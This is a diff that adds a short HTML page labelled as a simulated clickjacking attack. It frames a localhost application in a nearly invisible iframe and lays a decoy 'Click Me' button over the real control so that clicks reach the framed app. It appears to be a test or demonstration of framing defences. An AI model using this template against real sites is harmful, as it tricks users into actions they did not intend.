@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>evil-site.com</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1024px; /* Fixed width for iframe */
+            height: 768px; /* Fixed height for iframe */
+            border: none;
+            opacity: 0.1; /* Make the iframe nearly invisible */
+            z-index: 1; /* Ensure iframe is above fake content */
+        }
+
+        .fake-button {
+            position: absolute;
+            top: 360px; /* Match the real button's position in iframe */
+            left: 80px; /* Match the real button's position in iframe */
+            z-index: 2; /* Ensure fake button is above iframe */
+            background: red;
+            color: white;
+            padding: 20px;
+            font-size: 18px;
+            cursor: pointer;
+            pointer-events: none; /* Make this button unclickable */
+        }
+    </style>
+</head>
+<body>
+    <h1 style="text-align: center;">evil-site.com Malicious Page</h1>
+    <p style="text-align: center;">This is a simulated clickjacking attack. Below is an invisible iframe attempting to capture user interaction.</p>
+    <div class="fake-button">Click Me</div>
+    <iframe src="http://localhost:3000"></iframe>
+</body>
+</html>
